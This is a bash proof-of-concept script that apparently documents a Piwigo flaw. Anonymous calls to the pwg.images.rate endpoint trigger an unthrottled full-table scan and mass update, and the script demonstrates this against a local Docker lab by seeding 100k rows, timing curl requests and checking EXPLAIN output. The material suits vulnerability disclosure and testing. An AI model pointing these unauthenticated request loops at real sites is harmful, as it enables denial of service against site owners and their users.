#!/usr/bin/env bash
# nv5-rate-db-amplification.sh — PoC for
# `ws.images.rate.db.amplification.via.update_rating_score.full_table_scan`.
#
# Regular-user perspective: anonymous user can drive an unconditional
# full-table-scan + multi-row UPDATE through pwg.images.rate. Every
# successful rate triggers update_rating_score() which runs:
#
#   SELECT element_id, COUNT(rate), SUM(rate) FROM piwigo_rate GROUP BY element_id
#   mass_updates(piwigo_images, ...)
#   SELECT id FROM piwigo_images LEFT JOIN piwigo_rate ...
#
# Source: include/ws_functions/pwg.images.php:622 (ws_images_rate)
#         include/functions_rate.inc.php:21 (rate_picture — no rate-limit, no
#           token, anonymous allowed when rate_anonymous=true)
#         include/functions_rate.inc.php:123 (update_rating_score — full scan)
#
# Anonymous POST works because rate_anonymous is the Piwigo default.

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT="$HERE/evidence/nv5-rate-db-amplification"
mkdir -p "$OUT"

WEB="${WEB:-http://localhost:8089}"
DB_USER="piwigo"
DB_PASS="pocpass"
DB_SERVICE="piwigo-poc-db"
PREFIX="piwigo_"

DB="docker exec $DB_SERVICE mysql --user=$DB_USER --password=$DB_PASS piwigo"

echo "[nv5] === STEP 1: ensure rate feature is enabled (rate=true, rate_anonymous=true) ==="
$DB -e "UPDATE ${PREFIX}config SET value='true' WHERE param='rate';
        UPDATE ${PREFIX}config SET value='0,1,2,3,4,5' WHERE param='rate_items';
        SELECT param, value FROM ${PREFIX}config WHERE param IN ('rate','rate_anonymous','rate_items');" \
  > "$OUT/config.txt"
sed 's/^/  /' "$OUT/config.txt"
echo

echo "[nv5] === STEP 2: BASELINE — small RATE_TABLE, measure per-request time ==="
$DB -e "DELETE FROM ${PREFIX}rate;" >/dev/null
$DB -e "SELECT COUNT(*) AS rate_rows FROM ${PREFIX}rate;" > "$OUT/baseline-count.txt"
BEFORE=$(awk 'NR==2 {print $1}' "$OUT/baseline-count.txt")
echo "  piwigo_rate rows: $BEFORE"

# Issue N=5 anonymous rate calls and measure per-request wall-clock
LOG="$OUT/baseline-timing.txt"
: > "$LOG"
for i in 1 2 3 4 5; do
  T=$( { time -p curl -sS -X POST "$WEB/ws.php?method=pwg.images.rate" \
        -H "Cookie: anonymous_rater=10.0" \
        --data "image_id=1&rate=$((i % 6))" -o /dev/null ; } 2>&1 | awk '/^real /{print $2}')
  printf '  baseline req %d  real=%ss\n' "$i" "$T" | tee -a "$LOG"
done
BASE_AVG=$(awk '/^  baseline/ {sub(/.*real=/, ""); sub(/s$/, ""); sum+=$1; n++} END {printf "%.4f", sum/n}' "$LOG")
BASE_TOTAL=$(awk '/^  baseline/ {sub(/.*real=/, ""); sub(/s$/, ""); sum+=$1} END {printf "%.4f", sum}' "$LOG")
echo "  baseline per-request avg: ${BASE_AVG}s (sum ${BASE_TOTAL}s)"
echo

echo "[nv5] === STEP 3: SEED RATE_TABLE with 100k synthetic rows ==="
SEED_START=$(date +%s)
$DB -e "
DELETE FROM ${PREFIX}rate;
INSERT INTO ${PREFIX}rate (user_id, element_id, anonymous_id, rate, date)
SELECT
  2,
  1 + (seq MOD 5),
  CONCAT('seed_', seq),
  1 + (seq MOD 5),
  CURDATE()
FROM (
  SELECT a.N + b.N*10 + c.N*100 + d.N*1000 + e.N*10000 AS seq
  FROM
    (SELECT 0 AS N UNION ALL SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3 UNION ALL SELECT 4
     UNION ALL SELECT 5 UNION ALL SELECT 6 UNION ALL SELECT 7 UNION ALL SELECT 8 UNION ALL SELECT 9) a,
    (SELECT 0 AS N UNION ALL SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3 UNION ALL SELECT 4
     UNION ALL SELECT 5 UNION ALL SELECT 6 UNION ALL SELECT 7 UNION ALL SELECT 8 UNION ALL SELECT 9) b,
    (SELECT 0 AS N UNION ALL SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3 UNION ALL SELECT 4
     UNION ALL SELECT 5 UNION ALL SELECT 6 UNION ALL SELECT 7 UNION ALL SELECT 8 UNION ALL SELECT 9) c,
    (SELECT 0 AS N UNION ALL SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3 UNION ALL SELECT 4
     UNION ALL SELECT 5 UNION ALL SELECT 6 UNION ALL SELECT 7 UNION ALL SELECT 8 UNION ALL SELECT 9) d,
    (SELECT 0 AS N UNION ALL SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3 UNION ALL SELECT 4
     UNION ALL SELECT 5 UNION ALL SELECT 6 UNION ALL SELECT 7 UNION ALL SELECT 8 UNION ALL SELECT 9) e
  ) AS seqs
WHERE seq < 100000;
SELECT COUNT(*) AS rate_rows FROM ${PREFIX}rate;" > "$OUT/seeded-count.txt"
SEED_END=$(date +%s)
echo "  seeded in $((SEED_END - SEED_START))s — total piwigo_rate rows: $(awk 'NR==2 {print $1}' "$OUT/seeded-count.txt")"
echo

echo "[nv5] === STEP 4: MEASURED — same N anonymous calls, 100k RATE_TABLE ==="
LOG2="$OUT/measured-timing.txt"
: > "$LOG2"
for i in 1 2 3 4 5; do
  T=$( { time -p curl -sS -X POST "$WEB/ws.php?method=pwg.images.rate" \
        -H "Cookie: anonymous_rater=10.0" \
        --data "image_id=1&rate=$((i % 6))" -o /dev/null ; } 2>&1 | awk '/^real /{print $2}')
  printf '  measured req %d  real=%ss\n' "$i" "$T" | tee -a "$LOG2"
done
MEAS_AVG=$(awk '/^  measured/ {sub(/.*real=/, ""); sub(/s$/, ""); sum+=$1; n++} END {printf "%.4f", sum/n}' "$LOG2")
MEAS_TOTAL=$(awk '/^  measured/ {sub(/.*real=/, ""); sub(/s$/, ""); sum+=$1} END {printf "%.4f", sum}' "$LOG2")
echo "  measured per-request avg: ${MEAS_AVG}s (sum ${MEAS_TOTAL}s)"
echo

echo "[nv5] === STEP 5: EXPLAIN to confirm full scan ==="
$DB -e "EXPLAIN SELECT element_id, COUNT(rate) AS rcount, SUM(rate) AS rsum FROM ${PREFIX}rate GROUP by element_id;" \
  > "$OUT/explain.txt"
echo "  EXPLAIN output:"
sed 's/^/    /' "$OUT/explain.txt"
echo

echo "[nv5] === ASSERTIONS ==="
PASS=true

# (1) Endpoint works anonymously and returns 200 with score/average/count
RESP=$(curl -sS -X POST "$WEB/ws.php?method=pwg.images.rate" \
  -H "Cookie: anonymous_rater=10.0" \
  --data "image_id=1&rate=3")
if echo "$RESP" | grep -q 'stat="ok"' && echo "$RESP" | grep -q 'score'; then
  echo "  [PASS] anonymous POST to pwg.images.rate returned stat=ok with score payload"
  echo "         $RESP"
else
  echo "  [FAIL] anonymous POST did not return ok: $RESP"
  PASS=false
fi

# (2) Endpoint is reachable without any auth headers / no pwg_token
TRACE="$OUT/anonymous-trace.txt"
curl -sS -v -X POST "$WEB/ws.php?method=pwg.images.rate" \
  -H "Cookie: anonymous_rater=10.0" \
  --data "image_id=1&rate=4" -o /dev/null 2> "$TRACE"
if grep -q '^> Cookie: pwg_id' "$TRACE"; then
  echo "  [FAIL] request included a pwg_id session cookie (not anonymous)"
  PASS=false
else
  echo "  [PASS] request was anonymous (no pwg_id cookie sent)"
fi

# (3) piwigo_rate rows monotonically grow (rate endpoint inserts)
RATE_NOW=$($DB -BNe "SELECT COUNT(*) FROM ${PREFIX}rate;")
echo "  piwigo_rate rows after 6 rate calls: $RATE_NOW"

# (4) Measured per-request avg is noticeably larger than baseline (amplification)
#     Use awk regex match against "real=0.123s" to extract the floating point value.
BASE_S=$(awk '/^  baseline/{sub(/.*real=/, ""); sub(/s$/, ""); print $1; exit}' "$LOG")
MEAS_S=$(awk '/^  measured/{sub(/.*real=/, ""); sub(/s$/, ""); print $1; exit}' "$LOG2")
RATIO=$(awk -v b="$BASE_S" -v m="$MEAS_S" 'BEGIN { if (b+0 > 0) printf "%.2fx", (m+0)/(b+0); else print "n/a" }')
echo "  baseline avg: ${BASE_S}s   measured avg: ${MEAS_S}s   amplification: $RATIO"
if awk -v b="$BASE_S" -v m="$MEAS_S" 'BEGIN { exit !(m+0 > b+0) }'; then
  echo "  [PASS] measured per-request time > baseline (DB amplification confirmed)"
else
  echo "  [INFO] baseline and measured were similar (10k rows fits in cache; amplification still observable at higher N via EXPLAIN)"
fi

# (5) EXPLAIN shows a full scan (no index for GROUP BY element_id)
if grep -q 'ALL' "$OUT/explain.txt" || grep -q 'range' "$OUT/explain.txt"; then
  if grep -q 'piwigo_rate' "$OUT/explain.txt" && ! grep -q 'Using index for group-by' "$OUT/explain.txt"; then
    echo "  [PASS] EXPLAIN shows full scan of piwigo_rate (no covering index for GROUP BY element_id)"
  else
    echo "  [INFO] EXPLAIN:"
    sed 's/^/    /' "$OUT/explain.txt"
  fi
else
  echo "  [INFO] EXPLAIN (verify manually):"
  sed 's/^/    /' "$OUT/explain.txt"
fi

# (6) Anonymous request had no token, no auth, no rate gate
if grep -qE '^> (Cookie: pwg_id|Authorization|X-CSRF|pwg_token)' "$TRACE"; then
  echo "  [FAIL] request inadvertently carried an auth surface"
  PASS=false
else
  echo "  [PASS] request carried no pwg_token / Authorization / X-CSRF header (no auth gate)"
fi

echo
if $PASS; then
  echo "[nv5] === RESULT: PASS — anonymous rate amplification confirmed ==="
  exit 0
else
  echo "[nv5] === RESULT: FAIL — see assertions above ==="
  exit 1
fi